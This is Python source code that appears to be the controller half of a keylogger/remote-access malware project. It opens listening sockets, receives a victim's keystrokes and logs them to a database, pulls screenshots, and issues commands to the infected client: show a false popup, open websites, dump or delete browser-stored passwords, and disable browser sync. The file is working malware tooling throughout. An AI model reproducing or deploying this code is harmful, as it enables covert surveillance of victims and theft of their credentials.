import socket
import threading
import sqlite3
from datetime import datetime, date

# Server setup
HOST = '0.0.0.0'  # Listen on all network interfaces
PORT = 65434      # Port number to listen on

def add_to_db(res):
    now = datetime.now()
    current_time = now.strftime("%H:%M:%S")
    conn = sqlite3.connect('/home/rahul/PycharmProjects/woc-Malware/wocProject/Interface/keylogs.db')
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS keylogs (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        date TEXT,
                        time TEXT,
                        key TEXT
                     )''')
    conn.commit()
    cursor.execute("INSERT INTO keylogs VALUES (NULL, ?, ?, ?)", (date.today().isoformat(), current_time, res,))
    conn.commit()
    conn.close()

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)

print(f"Server listening on {HOST}:{PORT}")

site_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
site_socket.bind((HOST, PORT+1))
site_socket.listen(1)

stop_event = threading.Event()

conn, addr = server_socket.accept()
print(f"Connection established with {addr}")
sconn, saddr = site_socket.accept()
def siteListener(sconn, saddr, stop_event):
    while not stop_event.is_set():
        webdata = sconn.recv(1024)
        if not webdata:
            break
        if webdata.decode()[:3] == "[*]":
            print(webdata.decode())

keylist = []

def get_keystrokes():
    keylogs = ""
    while True:
        keystroke = conn.recv(1024)
        if not keystroke or keystroke.decode() == "exitPhrase":
            break
        print(keystroke.decode(), end="")
        keylogs = keylogs + keystroke.decode()
    add_to_db(keylogs)
    keylist.append(keylogs)

listenerThread = threading.Thread(target=siteListener, args=(sconn, saddr, stop_event))
listenerThread.start()

# Receive data
while True:

    user_choice = input("Enter your choice: \n1. Record Keystrokes\n2. Print recorded keystrokes for this session\n3. Take Screenshot\n4. Display False Popup\n5. Open a Website\n6. View Stored Passwords in Browser\n7. Delete passwords stored in browser\n8. Disable Sync in Browser\n9. Re-enable Sync\nq. Exit\n")
    conn.sendall(user_choice.encode())
    if user_choice == "1":
        get_keystrokes()
    elif user_choice == "2":
        i = 1
        for key in keylist:
            print(f"{i}. {key}")
            i = i+1
    elif user_choice == "3":

        # First, receive the file size (10-byte header):
        file_size = int(conn.recv(10).decode().strip())
        print(f"Expecting {file_size} bytes of data")

        # Now receive the screenshot in chunks until the expected size is received:
        received_data = b""
        while len(received_data) < file_size:
            packet = conn.recv(4096)  # Receive in chunks of 4 KB
            if not packet:
                break
            received_data += packet

        with open(f"/home/rahul/PycharmProjects/woc-Malware/wocProject/Interface/captured_screenshots/ss{date.today().isoformat()}_{datetime.now().strftime("%H:%M:%S")}.png", "wb") as f:
            f.write(received_data)
            f.flush()
        print(f"Screenshot saved as ss{date.today().isoformat()}_{datetime.now().strftime("%H:%M:%S")}.png.")
    elif user_choice == "4":
        print(conn.recv(1024).decode())
    elif user_choice == "5":
        url = input("Enter the website URL: ")
        conn.sendall(url.encode())
    elif user_choice == "6":
        while True:
            passwordData = conn.recv(1024).decode()
            if passwordData == "exitPhrase":
                break
            else:
                print(passwordData)
    elif user_choice == "7":
        print(conn.recv(1024).decode())
    elif user_choice == "8":
        print(conn.recv(1024).decode())
    elif user_choice == "9":
        print(conn.recv(1024).decode())
    elif user_choice == "q":
        # before exiting the program add keylist data to local database
        stop_event.set()
        listenerThread.join()
        conn.close()
        sconn.close()
        site_socket.close()
        server_socket.close()
        # os._exit(1)
        break

#increase keylogger time